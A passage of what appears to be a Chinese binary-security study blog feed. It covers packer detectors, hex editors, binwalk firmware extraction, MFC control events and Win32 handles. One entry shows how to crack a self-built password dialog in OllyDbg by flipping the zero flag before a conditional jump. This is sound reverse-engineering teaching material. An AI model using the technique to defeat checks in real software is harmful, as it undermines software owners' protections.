        <content type="html"><![CDATA[<h1 id="查壳⼯具的运⽤"><a href="#查壳⼯具的运⽤" class="headerlink" title="查壳⼯具的运⽤"></a>查壳⼯具的运⽤</h1><h2 id="PEiD"><a href="#PEiD" class="headerlink" title="PEiD"></a>PEiD</h2><p>用的少</p><h2 id="exeinfo"><a href="#exeinfo" class="headerlink" title="exeinfo"></a>exeinfo</h2><p>很不错啦【在win10的虚拟机里面】安装了最新版本。</p><p>用法就是直接打开就好了。把想要的文件拖进去</p><h2 id="Die"><a href="#Die" class="headerlink" title="Die"></a>Die</h2><p>这个可能是最good的</p><h1 id="安全补丁分析之Bindiff"><a href="#安全补丁分析之Bindiff" class="headerlink" title="安全补丁分析之Bindiff"></a>安全补丁分析之Bindiff</h1><p>经过我多次尝试。tmd  汉化版的ida和bindiff不能一起用。妈的</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230513223613619.png" alt="image-20230513223613619"></p><p>安装就不说了。累死我了。居然汉化版本IDA不</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础工具讲解（13）</title>
      <link href="/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-13-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-13-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Winhex-和-010Editor"><a href="#Winhex-和-010Editor" class="headerlink" title="Winhex 和 010Editor"></a>Winhex 和 010Editor</h1><h2 id="winhex"><a href="#winhex" class="headerlink" title="winhex"></a>winhex</h2><p>功能介绍：想看的看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">可以对硬盘、软盘、CD-ROM、DVD、ZIP及各种存储卡进⾏编辑</span><br><span class="line">⽀持FAT、NTFS、Ext2/3、ReiserFS、Reiser4、UFS、CDFS、UDF等⽂件系统</span><br><span class="line">可⽀持重组RAID及动态磁盘</span><br><span class="line">附带数据恢复功能</span><br><span class="line">可以访问物理内存及虚拟内存</span><br><span class="line">内置数据解释器，可以识别解释20种数据类型</span><br><span class="line">可以⽤数据结构模板查看、编辑结构数据</span><br><span class="line">可以分割与合并⽂件</span><br><span class="line">可以对⽂件进⾏分析与对⽐</span><br><span class="line">具有灵活的搜索和替换功能</span><br><span class="line">可以对磁盘进⾏克隆</span><br><span class="line">可对磁盘进⾏压缩镜像备份，⽀持对备份⽂件进⾏分卷处理</span><br><span class="line">具有编程接⼝，⽀持脚本操作</span><br><span class="line">⽀持256位加密、校验和、CRC32、hash（MD5，SHA-1）计算</span><br><span class="line">⽀持对磁盘进⾏数据安全销毁</span><br><span class="line">包含ANSI ASCII, IBM ASCII, EBCDIC, Unicode字符集</span><br><span class="line">⽀持⽂件⼤⼩超过4GB</span><br></pre></td></tr></table></figure><h3 id="1-标记位置"><a href="#1-标记位置" class="headerlink" title="1.标记位置"></a>1.标记位置</h3><p>首先用鼠标，把要选中的位置索引住。然后按下 Ctrl+I/导航–&gt;标记位置</p><p>跳转到标记处：Ctrl+K/导航–&gt;转到标记。</p><h3 id="2-位置管理器"><a href="#2-位置管理器" class="headerlink" title="2.位置管理器"></a>2.位置管理器</h3><p>也就是对某个特定的值，进行搜索。</p><p>导航–&gt;位置管理器。搜索-&gt;【你想要的】</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230513144659031.png" alt="image-20230513144659031" style="zoom:50%;" /><h3 id="3-分割文件"><a href="#3-分割文件" class="headerlink" title="3.分割文件"></a>3.分割文件</h3><p>把一个文件分割成好几个文件。</p><p>工具–&gt;文件工具–&gt;文件分割</p><h3 id="4-链接文件"><a href="#4-链接文件" class="headerlink" title="4.链接文件"></a>4.链接文件</h3><p>把好几个文件链接在一起。【首位相连的】</p><p>工具–&gt;文件工具–&gt;文件合并</p><h3 id="5-同步比较文件或者磁盘"><a href="#5-同步比较文件或者磁盘" class="headerlink" title="5.同步比较文件或者磁盘"></a>5.同步比较文件或者磁盘</h3><p>首先打开2个</p><p>查看–&gt;同步窗口/同步和比较</p><h2 id="010Editor"><a href="#010Editor" class="headerlink" title="010Editor"></a>010Editor</h2><p>不说了，遇到了在 查，这东西又不是靠背的。不懂的情况下可以查。</p><h1 id="固件分析：Binwalk、file"><a href="#固件分析：Binwalk、file" class="headerlink" title="固件分析：Binwalk、file"></a>固件分析：Binwalk、file</h1><p>首先，这2个都是在kali下运行的。</p><h2 id="file-gt-是一个命令"><a href="#file-gt-是一个命令" class="headerlink" title="file ==&gt;是一个命令"></a>file ==&gt;是一个命令</h2><p>file 1.txt【格式】</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230513152958720.png" alt="image-20230513152958720" style="zoom:50%;" /><h2 id="binwalk-gt-是工具"><a href="#binwalk-gt-是工具" class="headerlink" title="binwalk==&gt;是工具"></a>binwalk==&gt;是工具</h2><p>binwalk –help  显示binwalk帮助</p><p>Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] …</p><h3 id="签名扫描"><a href="#签名扫描" class="headerlink" title="签名扫描"></a>签名扫描</h3><p>Binwalk可以扫描固件映像以查找许多不同的嵌⼊式⽂件类型和⽂件系统。</p><p>binwalk FILE1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-y filesystem只扫描⽂件系统 -y选中</span><br><span class="line">-x filesystem 不扫描⽂件系统 -x过滤</span><br><span class="line">-a，-finclude = </span><br><span class="line">仅扫描名称与给定正则表达式字符串匹配的⽂件</span><br><span class="line">-p，--fexclude = </span><br><span class="line">不扫描名称与给定正则表达式字符串匹配的⽂件```</span><br></pre></td></tr></table></figure><p><strong>-M递归扫描</strong></p><p>**⽂件提取-e **   binwalk提取其在固件映像中找到的所有⽂件</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230513153642432.png"></p><h3 id="可能用到的"><a href="#可能用到的" class="headerlink" title="可能用到的"></a>可能用到的</h3><p>下面的不用记住啦，这东西以后多用，自然就记住了</p><p>只解压出⽂件系统  -y</p><p>binwalk -y filesystem -e IoTGoat-raspberry-pi2.img</p><p>附加-a，-finclude = </p><p>仅扫描名称与给定正则表达式字符串匹配的⽂件。</p><p>binwalk -M -e -a = ’ \ .bin $ ’ firmware.bin</p><p>附加-C，–directory = 选项</p><p>设置提取数据的输出⽬录（默认：当前⼯作⽬录）</p><p>binwalk -e –directory = /tmp firmware.bin</p><p>附加-r选项</p><p>清理⼤⼩为零的⽂件以及提取过程中提取实⽤程序⽆法处理的⽂件</p><p>附加-d n</p><p>递归解压深度为n</p><p>附加-f，-log = &lt;⽂件&gt;</p><p>将扫描结果记录到指定⽂件。</p><p>binwalk –log = binwalk.log firmware.bin</p><p><strong>提取特定的类型</strong></p><p>-D选项-D, –dd=type[:ext[:cmd]</p><ul><li>ype是签名描述中包含的⼩写字符串（⽀持正则表达式）</li><li>ext是保存数据磁盘时使⽤的⽂件扩展名（默认为none）</li><li>cmd是在将数据保存到磁盘后执⾏的可选命令</li></ul><p>binwalk -D ‘zip archive:zip:unzip %e’ -D ‘png image:png’ firmware.bin</p><p>该选项将提取包含字符串“zip archive”,⽂件扩展名为“zip”的⽂件，然后执⾏“unzip”命令。</p><p>此外，PNG图像按原样提取，带有’png’⽂件扩展名。</p><p>请注意使⽤’％e’占位符。执⾏unzip命令时，此占位符将替换为解压缩⽂件的相对路径</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MFC的程序编写和安全分析（12）</title>
      <link href="/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-12-MFC%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%92%8C%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-12-MFC%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%92%8C%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>MFC(Microsoft Foundation Classes)是微软基础类库的简称，是微软公司实现的一个c++类库，主要封装了大部分的windows API函数</p><h1 id="MFC的事件和消息"><a href="#MFC的事件和消息" class="headerlink" title="MFC的事件和消息"></a>MFC的事件和消息</h1><p><strong>事件</strong></p><p>举一个例子：猎⼈在⼭中布置了⼀个陷阱，⼀头野猪掉进陷阱中了。这⾥的“野猪掉进陷阱”就是⼀个事件，但是这个事件发⽣时，猎⼈并不⼀定知道（猎⼈不可能⼀直盯着某个陷阱）；如果猎⼈想要在猎物掉⼊陷阱中时⻢上知道，该这么做呢？在陷阱上布置⼀个铃铛，当猎物掉⼊陷阱时，铃铛响。猎⼈知道后就可以做出相应的处理了这⾥的“铃铛响”就是⼀个消息</p><p><strong>事件会触发消息</strong></p><p><strong>事件发送了，不一定有消息</strong></p><p><strong>有消息传来，一般肯定有事件发送</strong></p><p><strong>消息：是被动的！你要自己安排时间去取出来看或检测</strong></p><p><strong>控件事件</strong>：<strong>是主动的！当发生时会执行其对应的函数</strong></p><h2 id="关于MFC下的控件的事件和属性"><a href="#关于MFC下的控件的事件和属性" class="headerlink" title="关于MFC下的控件的事件和属性"></a>关于MFC下的控件的事件和属性</h2><p><strong>CButton</strong></p><p>事件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BCN_HOTITEMCHANGE </span><br><span class="line">当⿏标进⼊或离开此按钮空间区域时发⽣该事件</span><br></pre></td></tr></table></figure><p><strong>CListCtrl</strong></p><p>事件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">NM_CLICK ⽤户单击列表时发送此消息</span><br><span class="line">NM_DBLCLK ⽤户双击列表时发送此消息</span><br><span class="line">NM_RCLICK ⽤户右键单击列表时发送此消息</span><br><span class="line">NM_RDBLCLK ⽤户右键双击列表时发送此消息</span><br><span class="line">NM_KILLFOCUS 列表失去焦点时发送此消息</span><br><span class="line">NM_OUTOFMEMORY 当内存溢出时产⽣</span><br><span class="line">NM_SETFOCUS 当列表视图控件获得焦点时产⽣</span><br><span class="line">LVN_BEGINDRAG ⿏标左键正在被触发以便进⾏拖放操作(当⿏标左键开始拖拽列表视图控件</span><br><span class="line">中的项⽬时产⽣)</span><br><span class="line">LVN_BEGINRDRAG ⿏标右键正在被触发以便进⾏拖放操作(当⿏标右键开始拖拽列表视图控</span><br><span class="line">件中的项⽬时产⽣)</span><br><span class="line">LVN_BEGINLABELEDIT 开始编辑项的⽂本</span><br><span class="line">LVN_COLUMNCLICK ⽤户单击列表的列时发送此消息</span><br><span class="line">LVN_DETELEITEM 当删除列表项时发送此消息</span><br><span class="line">LVN_DELETEALLITEMS 删除所有项</span><br><span class="line">LVN_ENDLABELEDIT 结束对项⽂本的编辑</span><br><span class="line">LVN_GETDISPINFO 请求需要显示的信息</span><br><span class="line">LVN_GETINFOTIP 请求显示在⼯具提示窗⼝内的附加的⽂本信息</span><br><span class="line">LVN_HOTTRACK ⿏标滑过某个项</span><br><span class="line">LVN_INSERTITEM 当向列表视图控件插⼊项⽬时产⽣</span><br><span class="line">LVN_ITEMACTIVATE 激活某个项</span><br><span class="line">LVN_ITEMCHANGED 某个项已经发⽣变化</span><br><span class="line">LVN_ITEMCHANGING 某个项⽬正在发⽣变化</span><br><span class="line">LVN_ITEMCHANGED 列表中的当前选择项将要改变时发送此消息</span><br><span class="line">LVN_KEYDOWN 某个键被按下</span><br><span class="line">LVN_MARQUEEBEGIN 开始某个边框选择</span><br><span class="line">LVN_ODCACHEHINT 虚拟列表控件的显示区域的内容发⽣了变化 LVN_ODSTATECHANGED</span><br><span class="line">虚拟列表的控件的某个项或某个范围内的项已经发⽣变化 LVN_ODFINDITEM 需要拥有者查找</span><br><span class="line">⼀个特定的回调项</span><br><span class="line">LVN_SETFOCUS 列表框获得焦点时发送此消息</span><br></pre></td></tr></table></figure><p>属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">View 列表视图的显示⻛格:图标(Icon)、⼩图标(Small Icon)、列表(list)、报表(Report)</span><br><span class="line">Align 列表中的⽂本对⻬⽅式:顶端对⻬(top)、左对⻬(left)</span><br><span class="line">Sort 列表中的记录排序:不排序(None)、升序(Ascending)，降序(Descending)按照列表的第⼀列字⺟顺序排序</span><br><span class="line">Border 选中时，使列表含有边框 Single selection 选中时，只能选择⼀条记录，否则，可以多⾏选择</span><br><span class="line">Auto arrange 选中时， ⾃动对⻬⽹格上的项</span><br><span class="line">No Label wrap 选中时，⽂本不折叠 Edit lables 选中时， 可以编辑标签</span><br><span class="line">No scroll 选中时，列表不能滚动 No column header 选中时，列表没有列表头</span><br><span class="line">No sort header 选中时，没有排序的表头</span><br><span class="line">Show selection always 总是显示选择项</span><br></pre></td></tr></table></figure><p><strong>CComboBox</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CBN_CLOSEUP: 组合框的列表框组件被关闭，简易组合框不会发送该通知消息</span><br><span class="line">CBN_DBLCLK: ⽤户在某列表项上双击⿏标，只有简易组合框才会发送该通知消息</span><br><span class="line">CBN_DROPDOWN: 组合框的列表框组件下拉，简易式组合框不会发送该通知消息</span><br><span class="line">CBN_EDITUPDATE: 在编辑框准备显示改变了的正⽂时发送该消息，下拉列表式组合框不会</span><br><span class="line">发送该消息</span><br><span class="line">CBN_EDITCHANGE: 编辑框的内容被⽤户改变了，与CBN_EDITUPDATE不同，该消息是在</span><br><span class="line">编辑框显示的正⽂被刷新后才发出的，下拉列表式组合框不会发送该消息</span><br><span class="line">CBN_ERRSPACE: 组合框⽆法申请⾜够的内存来容纳列表项</span><br><span class="line">CBN_SELENDCANCEL: 表明⽤户的选择应该取消，当⽤户在列表框中选择了⼀项，然后⼜在</span><br><span class="line">组合框控件外单击⿏标时就会导致该消息的发送</span><br><span class="line">CBN_SELENDOK: ⽤户选择了⼀项，然后按了回⻋键或单击了下滚箭头，该消息表明⽤户确</span><br><span class="line">认了⾃⼰所作的选择</span><br><span class="line">CBN_KILLFOCUS: 组合框失去了输⼊焦点</span><br><span class="line">CBN_SELCHANGE: ⽤户通过单击或移动箭头键改变了列表的选择</span><br><span class="line">CBN_SETFOCUS: 组合框获得了输⼊焦点</span><br></pre></td></tr></table></figure><p><strong>CEdit:</strong></p><p>事件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EN_CHANGE 当编辑控件中的⽂本已被修改，在新的⽂本显示之后发送此消息</span><br><span class="line">EN_ERRSPACE 编辑框控件⽆法申请⾜够的动态内存来满⾜需要</span><br><span class="line">EN_HSCROLL 当编辑控件的⽔平滚动条被使⽤，在更新显示之前发送此消息</span><br><span class="line">EN_KILLFOCUS 编辑控件失去键盘输⼊焦点时发送此消息</span><br><span class="line">EN_MAXTEXT ⽂本数⽬到达了限定值时发送此消息</span><br><span class="line">EN_SETFOCUS 编辑控件得到键盘输⼊焦点时发送此消息</span><br><span class="line">EN_UPDATE 当编辑控件中的⽂本已被修改，在新的⽂本显示之前发送此消息</span><br><span class="line">EN_VSCROLL 当编辑控件的垂直滚动条被使⽤，在更新显示之前发送此消息</span><br></pre></td></tr></table></figure><p>属性:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Align text 各⾏⽂本对⻬⽅式:Left、Center、Right，缺省时为Left Multiline 选中时为多⾏编辑控件，否则为单⾏编辑控件</span><br><span class="line">Number 选中时控件只能输⼊数字 Horizontal scroll ⽔平滚动，仅对多⾏编辑控件有效Auto</span><br><span class="line">Hscroll 当⽤户在⾏尾键⼊⼀个字符时，⽂本⾃动向右滚动 Vertical scroll 垂直滚动，仅对多⾏编辑控件有效 Auto Vscroll 当⽤户在最后⼀⾏按ENTER键时，⽂本⾃动向上滚动⼀⻚，仅对多⾏编辑控件有效</span><br><span class="line">Password 选中时，键⼊编辑控件的字符都将显示为“*”，仅对单⾏编辑控件有效。 No hide</span><br><span class="line">selection 通常情况下，当编辑控件失去键盘焦点时，被选择的⽂本仍然反⾊显示。选中该项</span><br><span class="line">时，则不具备此功能。</span><br><span class="line">OEM convert 选中时，实现对特定字符集的字符转换。 Want return 选中时，⽤户按下</span><br><span class="line">ENTER键，编辑控件中会插⼊⼀个回⻋符。</span><br><span class="line">Border 选中时，在控件的周围存在边框。</span><br><span class="line">Uppercase 选中时，编辑框中的字符全部⼤写。</span><br><span class="line">Lowercase 选中时，编辑框中的字符全部为⼩写。</span><br><span class="line">Read_Only 选中时，防⽌⽤户键⼊或编辑⽂本。</span><br></pre></td></tr></table></figure><p><strong>CListBox:</strong></p><p>事件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LBN_DBLCLK : ⽤户⽤⿏标双击了⼀列表项，只有具有LBS_NOTIFY 的列表框才能发送该消</span><br><span class="line">息</span><br><span class="line">LBN_ERRSPACE : 列表框不能申请⾜够的动态内存来满⾜需要 LBN_KILLFOCUS : 列表框失</span><br><span class="line">去输⼊焦点</span><br><span class="line">LBN_SELCANCEL: 当前的选择被取消，只有具有LBS_NOTIFY 的列表框才能发送该消息</span><br><span class="line">LBN_SELCHANGE: 单击⿏标选择了⼀列表项，只有具有LBS_NOTIFY 的列表框才能发送该</span><br><span class="line">消息</span><br><span class="line">LBN_SETFOCUS: 列表框获得输⼊焦点</span><br><span class="line">WM_CHARTOITEM: 当列表框收到WM_CHAR 消息后， 向⽗窗⼝发送该消息， 只有具有</span><br><span class="line">LBS_WANTKEYBOARDINPUT ⻛格的列表框才会发送该消息</span><br><span class="line">WM_VKEYTOITEM: 当列表框收到WM_KEYDOWN 消息后，向⽗窗⼝发送该消息，只有具有</span><br><span class="line">LBS_WANTKEYBOARDINPUT ⻛格的列表框才会发送该消息</span><br></pre></td></tr></table></figure><p><strong>以上的！！遇到了在查</strong></p><h1 id="MFC的程序编写和安全分析"><a href="#MFC的程序编写和安全分析" class="headerlink" title="MFC的程序编写和安全分析"></a>MFC的程序编写和安全分析</h1><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511224949238.png" alt="image-20230511224949238" style="zoom: 33%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511225006076.png" alt="image-20230511225006076" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511225015441.png" alt="image-20230511225015441" style="zoom:50%;" /><p>创建好后</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511231710891.png" alt="image-20230511231710891" style="zoom:50%;" /><p>找到这个位置。利用工具箱。把东西写好</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511231815667.png" alt="image-20230511231815667" style="zoom: 50%;" /><p>用工具箱里面的 static text 和 button 和 edit control 创建好和上图一样后。编译运行。生成一个exe。</p><p>我们运⾏起来发现，随便输⼊⼀个字他会弹出失败了，再来⼀次吧的弹窗。那么我们尝试去破解他，使其我们输⼊啥，他都会提示我们破解成功！</p><p>首先把它放入od 里面</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230512132420909.png" alt="image-20230512132420909" style="zoom:50%;" /><p>通过全局搜索，找到我们破解的地方</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230512132441479.png" alt="image-20230512132441479" style="zoom:50%;" /><p>点进去</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230512132454309.png" alt="image-20230512132454309" style="zoom:50%;" /><p>看到这句话之前有一个je 的跳转，我们知道je的跳转就是说ZF标志位=1就会跳转</p><p>我们在前面的call【我觉得这里是调用对话框的一个cakl】设置一个断点，然后运行程序。在程序中随便输入一个值后，程序停下来了。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230512132725671.png" alt="image-20230512132725671" style="zoom:50%;" /><p>这个时候，我们单步运行。在je之前。发现zf标志位是1.我们人为的把他改成0后继续运行</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230512132738474.png" alt="image-20230512132738474" style="zoom:50%;" /><p>ok 破解成功…..</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Win32汇编讲解下（11）</title>
      <link href="/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-11-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2023/05/11/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-11-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-句柄"><a href="#1-句柄" class="headerlink" title="1.句柄"></a>1.句柄</h1><p>句柄就是个数字，⼀般和当前系统下的整数的位数⼀样，⽐如32bit系统下就是4个字节。</p><p>这个数字是⼀个对象的唯⼀标示，和对象⼀⼀对应</p><p>这个对象可以是⼀个块内存，⼀个资源，或者⼀个服务的context（如 socket，thread）等等</p><p><strong>指针</strong>其实也是⼀种”句柄”，只是由于指针同时拥有更特殊的含义——实实在在地对应内存⾥地⼀个地址</p><p>在进程的地址空间中设⼀张表，表⾥头专⻔保存⼀些编号和由这个编号对应⼀个地址，⽽由那个地址去引⽤实际的对象，这个编号跟那个地址在数值上没有任何规律性的联系，纯粹是个映射⽽已。</p><p><strong>在windows这个编号就是“句柄”</strong></p><p>为什么不用首地址呢？</p><ul><li>暴露了内核对象本身，使得程序（⽽不是操作系统内核）也可以任意地修改对象地内部状态,这显然是操作系统内核所不允许的</li><li>操作系统有定期整理内存的责任，如果⼀些内存整理过⼀次后，对象被搬⾛了怎么办？</li></ul><p>看一个例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//根据窗⼝名获取记事本窗⼝句柄 </span></span><br><span class="line">HWND hw = <span class="built_in">FindWindow</span>(<span class="string">L&quot;notepad&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, hw);<span class="comment">//可以打印窗⼝句柄看看是个什么值</span></span><br><span class="line">RECT rect;</span><br><span class="line"><span class="built_in">GetWindowRect</span>(hw, &amp;rect);<span class="comment">//有了窗⼝句柄我们⾃然能对他进⾏⼀些操作了，⽐如获取窗⼝宽与⾼</span></span><br><span class="line"><span class="type">int</span> w = rect.right - rect.left, h = rect.bottom - rect.top;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;宽:&quot;</span> &lt;&lt; w &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="string">&quot;高：&quot;</span> &lt;&lt; h &lt;&lt; endl;</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, szPath, MAX_PATH);<span class="comment">//同理可以通过模块句柄获取当前⽬录下的路径，在这个API中填NULL，他即可获取当前进程中的模块句柄</span></span><br><span class="line">_tprintf(<span class="built_in">TEXT</span>(<span class="string">&quot;%s\n&quot;</span>), szPath);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511202557027.png" alt="image-20230511202557027" style="zoom: 50%;" /><p>所以说，有了某个进程的句柄，就能对之进行操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line"> DWORD dwThreadId;</span><br><span class="line"> <span class="comment">//根据窗⼝名获取记事本窗⼝句柄 </span></span><br><span class="line"> HWND hw = <span class="built_in">FindWindow</span>(<span class="string">L&quot;notepad&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line"> <span class="built_in">GetWindowThreadProcessId</span>(hw, &amp;dwThreadId);<span class="comment">//根据窗⼝句柄发现进程的pid</span></span><br><span class="line"> HANDLE 